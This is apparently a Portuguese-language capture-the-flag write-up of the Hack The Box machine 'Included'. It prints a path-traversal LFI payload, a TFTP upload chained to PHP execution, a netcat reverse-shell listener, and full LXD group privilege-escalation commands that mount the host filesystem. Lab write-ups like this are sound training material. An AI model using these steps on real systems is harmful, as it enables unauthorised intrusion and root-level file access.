---
title: Included
description: Da LFI ao acesso ao filesystem do host por meio de TFTP, PHP e LXD.
platform: Hack The Box
os: Linux
difficulty: Very Easy
category: starting-point
tier: '2'
status: published
image: /images/machines/included.png
imageAlt: 'Avatar oficial da máquina Included: rosto dividido entre uma pessoa e uma criatura verde, em uma moldura roxa.'
tags: [Hack The Box, Starting Point, Tier 2]
techniques: [LFI, TFTP, Reverse Shell, Credential Reuse, LXD]
date: 2026-10-16
---

## Objetivo

A **Included** é uma máquina Linux *Very Easy* do *Starting Point* do Hack The Box. O objetivo foi obter acesso inicial explorando uma aplicação web vulnerável a *Local File Inclusion* (LFI), usar o serviço TFTP para enviar um arquivo PHP, conseguir uma shell e escalar privilégios por meio do grupo `lxd`.

```text
Nmap → HTTP + TFTP → parâmetro ?file= → LFI → /etc/passwd
→ diretório TFTP → upload de PHP → inclusão pela LFI → reverse shell
→ www-data → .htpasswd → credencial de mike → PTY → su mike
→ grupo lxd → imagem Alpine → container privilegiado
→ filesystem do host montado → /root → root.txt
```

## Enumeração com Nmap

A primeira etapa foi identificar os serviços expostos. Foram encontrados principalmente HTTP em `80/TCP` e TFTP em `69/UDP`: um servidor web e um serviço de transferência de arquivos.

![Terminal com os resultados da enumeração de HTTP e TFTP no Nmap.](/images/writeups/included/01-nmap-reconhecimento.png)

*Enumeração inicial dos serviços HTTP e TFTP.*

## Aplicação web

Ao acessar o servidor HTTP, a aplicação utilizava um parâmetro semelhante a:

```text
?file=home.php
```

Isso chamou atenção porque o servidor parecia carregar um arquivo com base em um parâmetro controlado pelo usuário.

![Aplicação web com o parâmetro file na URL.](/images/writeups/included/02-aplicacao-web.png)

*O parâmetro `file` na aplicação web.*

## Local File Inclusion

Foi testado:

```text
?file=../../../../etc/passwd
```

O servidor retornou o conteúdo de `/etc/passwd`, confirmando a LFI. O caminho controlado pelo parâmetro `file` permitia navegar com `../` até um arquivo local.

![Conteúdo de /etc/passwd exibido pela aplicação web.](/images/writeups/included/03-teste-lfi.png)

*Leitura de `/etc/passwd` por meio da LFI.*

### Enumeração pelo `/etc/passwd`

Ao analisar o arquivo, foram identificados usuários interessantes, incluindo `tftp` e `mike`. Também foi possível identificar o diretório utilizado pelo serviço TFTP: `/var/lib/tftpboot/`.

## TFTP e envio do PHP

A porta `69/UDP` executava TFTP. Diferentemente do FTP, o TFTP é um protocolo mais simples e normalmente não possui `ls`, `pwd` nem autenticação tradicional.

Para conectar:

```bash
tftp IP_DO_ALVO
```

![Terminal conectado ao serviço TFTP.](/images/writeups/included/04-conexao-tftp.png)

*Conexão com o serviço TFTP.*

Foi criado um PHP simples para testar a execução:

```php
<?php echo "teste_ok"; ?>
```

Depois, o arquivo foi enviado pelo TFTP:

```text
put teste.php
```

O arquivo foi salvo em `/var/lib/tftpboot/teste.php`.

![Envio de teste.php pelo TFTP.](/images/writeups/included/05-upload-tftp.png)

*Envio do arquivo PHP de teste.*

## Combinando TFTP e LFI

Conseguir enviar um arquivo pelo TFTP ainda não significava que ele seria executado. Como já havia uma LFI, foi utilizado:

```text
?file=../../../../var/lib/tftpboot/teste.php
```

A resposta apresentou `teste_ok`. Assim, o arquivo enviado pelo TFTP foi incluído pela LFI e o servidor interpretou o PHP.

```text
TFTP → upload de teste.php → /var/lib/tftpboot/teste.php
→ LFI inclui o arquivo → servidor interpreta PHP
```

![Resposta da aplicação ao incluir o PHP enviado pelo TFTP.](/images/writeups/included/06-execucao-php-lfi.png)

*Execução do PHP enviado pelo TFTP por meio da LFI.*

## Reverse shell e acesso inicial

Depois de confirmar a execução de PHP, foi utilizado um arquivo PHP para obter uma *reverse shell*. No Kali, o listener foi iniciado com:

```bash
nc -lvnp 4444
```

O arquivo foi enviado novamente pelo TFTP e chamado pela LFI. A conexão reversa forneceu acesso inicial como `www-data`.

```text
PHP enviado → TFTP → arquivo salvo → LFI inclui PHP
→ PHP executado → conexão reversa → shell
```

![Terminal com a reverse shell como www-data.](/images/writeups/included/07-acesso-inicial.png)

*Acesso inicial como `www-data`.*

## Enumeração interna e credenciais

Com acesso ao servidor, foi analisado `/var/www/html`. Ali foram encontrados `.htaccess` e `.htpasswd`.

![Arquivos encontrados no diretório da aplicação web.](/images/writeups/included/08-enumeracao-web.png)

*Arquivos `.htaccess` e `.htpasswd` no diretório web.*

O `.htaccess` indicava:

```text
AuthUserFile /var/www/html/.htpasswd
```

Isso revelou que `.htpasswd` era utilizado para autenticação. Ao analisá-lo, foram encontradas informações relacionadas ao usuário `mike`. Foi possível recuperar a credencial necessária para mudar para esse usuário.

![Inspeção dos arquivos de autenticação e da entrada de mike.](/images/writeups/included/09-arquivos-autenticacao.png)

*Descoberta da credencial de `mike` em `.htpasswd`.*

## Upgrade da shell e mudança para `mike`

Ao tentar `su mike`, a reverse shell apresentou um erro semelhante a:

```text
su: must be run from a terminal
```

Isso aconteceu porque a reverse shell simples não possuía um TTY. Foi criado um pseudo-terminal com:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Depois disso, `su mike` funcionou:

```bash
su mike
```

Com a senha descoberta, foi possível mudar de `www-data` para `mike`. A mudança de usuário ilustra *Credential Reuse* e *Lateral Movement*.

![Criação do pseudo-terminal e mudança para mike.](/images/writeups/included/10-upgrade-pty.png)

*Upgrade da shell com PTY e acesso como `mike`.*

## User flag

Após obter acesso como `mike`, foi possível localizar a flag de usuário:

```bash
cd /home/mike
ls -la
cat user.txt
```

![Localização de user.txt no diretório de mike.](/images/writeups/included/11-user-flag.png)

*Flag de usuário no diretório de `mike`.*

## Enumeração de privilégios

Depois de obter acesso como `mike`, foi necessário verificar seus privilégios:

```bash
id
```

O resultado indicou que `mike` pertencia ao grupo `lxd`. Isso chamou atenção porque usuários desse grupo podem administrar containers LXD.

![Resultado de id mostrando o grupo lxd de mike.](/images/writeups/included/12-grupo-lxd.png)

*Identificação do grupo `lxd`.*

### O que é LXD

LXD é uma tecnologia de gerenciamento de containers. Membros do grupo `lxd` podem possuir permissões poderosas sobre eles. Em determinadas configurações, isso pode ser usado para obter acesso privilegiado ao host.

## Preparação e transferência da imagem Alpine

Para criar um container, foi utilizada a distribuição Linux Alpine. No Kali, um builder foi usado para gerar a imagem:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

Isso gerou um arquivo semelhante a `alpine-v3.x-x86_64-....tar.gz`.

Para transferir a imagem, no Kali foi utilizado:

```bash
python3 -m http.server 8000
```

E, no alvo:

```bash
wget http://IP_DO_KALI:8000/ARQUIVO_ALPINE.tar.gz
```

![Transferência da imagem Alpine para o alvo.](/images/writeups/included/13-transferencia-alpine.png)

*Transferência da imagem Alpine.*

### Importação no LXD

No alvo, a imagem foi importada e listada:

```bash
lxc image import ARQUIVO_ALPINE.tar.gz --alias alpine
lxc image list
```

![Importação e listagem da imagem Alpine no LXD.](/images/writeups/included/14-importacao-alpine.png)

*Imagem Alpine importada no LXD.*

## Container privilegiado e filesystem do host

Foi criado um container chamado `privesc`:

```bash
lxc init alpine privesc
```

Depois, ele foi configurado como privilegiado:

```bash
lxc config set privesc security.privileged true
```

A etapa principal da escalada foi montar a raiz do host dentro do container:

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Em `source=/`, `/` é a raiz do host. Em `path=/mnt/root`, `/mnt/root` é onde essa raiz será montada dentro do container:

```text
HOST                    CONTAINER
/                       /mnt/root
/etc                    /mnt/root/etc
/home                   /mnt/root/home
/root                   /mnt/root/root
/var                    /mnt/root/var
```

![Configuração do container privilegiado e montagem da raiz do host.](/images/writeups/included/15-configuracao-container.png)

*Container `privesc` configurado com a raiz do host montada.*

O container foi iniciado e a shell aberta com:

```bash
lxc start privesc
lxc exec privesc /bin/sh
```

![Inicialização do container e abertura da shell.](/images/writeups/included/16-acesso-container.png)

*Acesso à shell do container.*

Dentro dele, `ls /mnt/root` mostrava diretórios como `bin`, `boot`, `etc`, `home`, `root`, `usr` e `var`. Eram os arquivos do host montados no container.

## Root flag

No host, a flag estava em `/root/root.txt`. Como `/` foi montado em `/mnt/root`, o caminho dentro do container passou a ser `/mnt/root/root/root.txt`:

```bash
cat /mnt/root/root/root.txt
```

![Acesso ao diretório da root flag pelo filesystem montado.](/images/writeups/included/17-root-flag.png)

*Acesso à root flag pelo caminho montado no container.*

### Entendendo a escalada LXD

```text
mike → membro do grupo lxd → administração de containers
→ container privilegiado → montagem de / do host
→ acesso ao filesystem do host → acesso a /root
```

Essa técnica é conhecida como *LXD Privilege Escalation* ou *Privilege Escalation via LXD Group*.

O processo não foi simplesmente passar de `mike` para uma shell root no host. O controle sobre o LXD permitiu criar um container privilegiado e montar o filesystem do host para acessar seus arquivos protegidos. Ser root dentro do container não significa automaticamente ser root no host; o ponto crítico foi o acesso à raiz da máquina real por meio da montagem.

## Dificuldades e erros

### TFTP não possui `ls`

Durante o acesso ao TFTP, foram tentados comandos semelhantes aos do FTP. O TFTP não possui listagem de diretórios. Também foi aprendido que `Ctrl+Z` apenas suspende o processo; para sair corretamente, usa-se `quit`.

### Caminho da LFI

Foi necessário entender que `../../../../` navega pelo filesystem do servidor. Assim, `../../../../var/lib/tftpboot/teste.php` permitia alcançar o arquivo enviado pelo TFTP.

### `su` precisava de terminal

A shell inicial não possuía TTY. Por isso, `su mike` não funcionava inicialmente e foi necessário criar o pseudo-terminal com `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

### Importação da Alpine

Inicialmente, foi tentado:

```bash
lxc image import alpine.tar.gz alpine-rootfs.tar.gz --alias alpine
```

Mas esses arquivos ainda não existiam. Foi necessário primeiro gerar a imagem Alpine e transferi-la para a máquina.

### Caminho da root flag

Depois de montar `/` do host em `/mnt/root`, houve confusão com `/root/root.txt`. O caminho correto dentro do container tornou-se `/mnt/root/root/root.txt`.

## Comandos importantes

Além dos comandos apresentados ao longo da resolução, minhas notas reuniram estes exemplos:

```text
tftp IP
put arquivo.php
quit
```

Para identificar grupos, `id` ou `groups`. Para consultar imagens LXD, `lxc image list`. A sequência de importação, criação, configuração e acesso ao container está registrada nas etapas acima. O exemplo de importação resumido nas notas é:

```bash
lxc image import alpine.tar.gz --alias alpine
```

## Conceitos e ferramentas

Os conceitos registrados foram LFI, TFTP, PTY, *Credential Reuse*, *Lateral Movement*, LXD e *LXD Privilege Escalation*. As ferramentas utilizadas incluíram Nmap, TFTP, Netcat, Python, LXC, LXD e `wget`.

## O que aprendi com a máquina

A máquina mostrou como vulnerabilidades aparentemente separadas podem ser combinadas. A aplicação web possuía uma LFI, enquanto o servidor permitia upload via TFTP. Isoladamente, nenhuma das duas técnicas necessariamente daria uma shell. Juntas, o upload pelo TFTP e a inclusão pela LFI permitiram executar PHP.

Depois do acesso inicial, a enumeração revelou credenciais que permitiram mudar para outro usuário. Por fim, a participação desse usuário no grupo `lxd` permitiu usar o gerenciamento de containers para montar o filesystem do host e acessar arquivos protegidos.

```text
Enumeração → LFI → TFTP Upload → PHP Execution → Reverse Shell
→ Credential Discovery → Lateral Movement → LXD Group
→ Privileged Container → Host Filesystem Mount → Privilege Escalation
```
